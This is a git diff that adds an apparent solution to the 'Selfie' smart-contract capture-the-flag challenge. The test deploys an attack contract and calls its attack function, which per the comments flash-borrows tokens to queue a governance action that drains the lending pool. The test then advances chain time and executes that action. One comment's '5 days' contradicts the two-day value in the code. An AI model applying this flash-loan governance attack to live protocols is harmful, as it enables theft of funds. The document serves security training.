@@ -31,6 +31,21 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // want to queue action in governance to make a drain call to selfie pool, and then transfer them to the attacker
+        // how do we do this? 
+        // flash loan to propose action
+        // make receiver pool contract, provide data w/ drainAllFunds call
+        //
+        const attackSelfieFactory = await ethers.getContractFactory('AttackSelfie', attacker);
+        const attackSelfie = await attackSelfieFactory.deploy(this.pool.address, this.token.address, this.governance.address);
+        await attackSelfie.connect(attacker).attack();
+
+        // Advance time 2 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+
+
+        const actionId = await attackSelfie.action();
+        await this.governance.connect(attacker).executeAction(actionId);
     });
 
     after(async function () {
